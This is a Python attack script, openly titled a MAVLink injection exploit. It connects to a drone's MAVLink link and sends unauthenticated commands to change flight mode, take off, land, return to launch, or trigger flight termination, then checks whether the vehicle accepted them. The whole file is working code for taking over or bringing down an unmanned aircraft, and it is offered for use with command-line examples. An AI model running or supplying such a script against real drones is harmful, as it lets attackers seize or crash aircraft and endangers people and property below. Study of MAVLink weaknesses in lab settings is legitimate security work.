#!/usr/bin/env python3
"""
MAVLink Injection Exploit Script
Injects malicious MAVLink commands into drone communication
"""

import sys
import time
from pymavlink import mavutil

def inject_command(connection_string: str, command: str, params: list = None):
    """
    Inject a MAVLink command
    
    Args:
        connection_string: MAVLink connection string (e.g., 'udp:127.0.0.1:14550')
        command: Command to inject (e.g., 'SET_MODE', 'TAKEOFF')
        params: Command parameters
    """
    try:
        print(f"[*] Connecting to {connection_string}...")
        master = mavutil.mavlink_connection(connection_string)
        master.wait_heartbeat()
        print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        print(f"[*] Target System: {target_system}, Component: {target_component}")
        print(f"[*] Injecting command: {command}")
        
        if command == "SET_MODE":
            # Change flight mode
            mode_id = params[0] if params else 4  # GUIDED mode
            master.mav.set_mode_send(
                target_system,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                mode_id
            )
            print(f"[+] SET_MODE command sent (mode: {mode_id})")
        
        elif command == "TAKEOFF":
            # Takeoff command
            altitude = params[0] if params else 10.0
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
                0, 0, 0, 0, 0, 0, 0, altitude
            )
            print(f"[+] TAKEOFF command sent (altitude: {altitude}m)")
        
        elif command == "LAND":
            # Land command
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_NAV_LAND,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            print("[+] LAND command sent")
        
        elif command == "RTL":
            # Return to launch
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            print("[+] RTL command sent")
        
        elif command == "FLIGHT_TERMINATION":
            # Flight termination
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
                0, 1, 0, 0, 0, 0, 0, 0
            )
            print("[+] FLIGHT_TERMINATION command sent")
        
        else:
            print(f"[-] Unknown command: {command}")
            print("[*] Available commands: SET_MODE, TAKEOFF, LAND, RTL, FLIGHT_TERMINATION")
            return False
        
        # Wait for acknowledgment
        time.sleep(1)
        msg = master.recv_match(type='COMMAND_ACK', blocking=True, timeout=2)
        if msg:
            if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                print("[+] Command accepted by vehicle")
            else:
                print(f"[-] Command rejected: {msg.result}")
        
        return True
        
    except Exception as e:
        print(f"[-] Error injecting command: {e}")
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 mavlink_inject.py <connection> <command> [params...]")
        print("Example: python3 mavlink_inject.py udp:127.0.0.1:14550 SET_MODE")
        print("Example: python3 mavlink_inject.py udp:127.0.0.1:14550 TAKEOFF 20.0")
        sys.exit(1)
    
    connection = sys.argv[1]
    command = sys.argv[2]
    params = [float(p) if '.' in p else int(p) for p in sys.argv[3:]] if len(sys.argv) > 3 else None
    
    success = inject_command(connection, command, params)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
